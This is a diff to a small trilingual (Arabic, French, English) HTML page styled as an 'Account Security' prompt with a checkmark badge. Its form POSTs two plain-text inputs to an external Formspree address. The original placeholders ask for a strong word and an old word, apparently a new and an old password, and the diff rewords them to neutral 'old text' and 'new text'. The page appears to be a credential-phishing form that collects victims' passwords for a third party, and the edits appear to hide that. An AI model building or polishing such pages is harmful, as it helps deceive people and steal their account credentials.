@@ -3,10 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>أمان حسابك</title>
 
 <style>
-*{box-sizing:border-box}
+*{
+  box-sizing:border-box;
+}
 
 body{
   margin:0;
@@ -84,6 +87,10 @@ button{
   cursor:pointer;
 }
 
+button:active{
+  transform:scale(.97);
+}
+
 .language{
   background:#eee;
   color:#333;
@@ -118,7 +125,12 @@ button{
 
 <body>
 
-<button class="theme-icon" id="themeIcon" onclick="toggleDark()">🌙</button>
+<button
+  class="theme-icon"
+  id="themeIcon"
+  onclick="toggleDark()"
+  type="button"
+>🌙</button>
 
 <div class="card">
 
@@ -127,27 +139,28 @@ button{
     <span class="badge">✓</span>
   </div>
 
-  <form action="https://formspree.io/f/xrpzoaod" method="POST">
+  <form
+    action="https://formspree.io/f/xrpzoaod"
+    method="POST"
+  >
 
     <input
       type="text"
-      name="test_text"
-      id="testText"
-      placeholder="اكتب كلمة قوية"
+      name="old_text"
+      placeholder="النص القديم"
       autocomplete="off"
       required
     >
 
     <input
       type="text"
-      name="test_text_2"
-      id="testText2"
-      placeholder="الكلمة القديمة"
+      name="new_text"
+      placeholder="النص الجديد"
       autocomplete="off"
       required
     >
 
-    <button id="send" type="submit">
+    <button type="submit" id="send">
       إرسال
     </button>
 
@@ -179,8 +192,7 @@ function toggleDark(){
 function changeLanguage(){
 
   const title=document.getElementById("title");
-  const input1=document.getElementById("testText");
-  const input2=document.getElementById("testText2");
+  const inputs=document.querySelectorAll("input");
   const send=document.getElementById("send");
 
   if(language==="ar"){
@@ -191,8 +203,8 @@ function changeLanguage(){
     document.documentElement.dir="ltr";
 
     title.textContent="Sécurité du compte";
-    input1.placeholder="Écrivez un mot fort";
-    input2.placeholder="Ancien mot";
+    inputs[0].placeholder="Ancien texte";
+    inputs[1].placeholder="Nouveau texte";
     send.textContent="Envoyer";
 
   }else if(language==="fr"){
@@ -202,8 +214,8 @@ function changeLanguage(){
     document.documentElement.lang="en";
 
     title.textContent="Account Security";
-    input1.placeholder="Write a strong word";
-    input2.placeholder="Old word";
+    inputs[0].placeholder="Old text";
+    inputs[1].placeholder="New text";
     send.textContent="Send";
 
   }else{
@@ -214,8 +226,8 @@ function changeLanguage(){
     document.documentElement.dir="rtl";
 
     title.textContent="أمان حسابك";
-    input1.placeholder="اكتب كلمة قوية";
-    input2.placeholder="الكلمة القديمة";
+    inputs[0].placeholder="النص القديم";
+    inputs[1].placeholder="النص الجديد";
     send.textContent="إرسال";
   }
 }
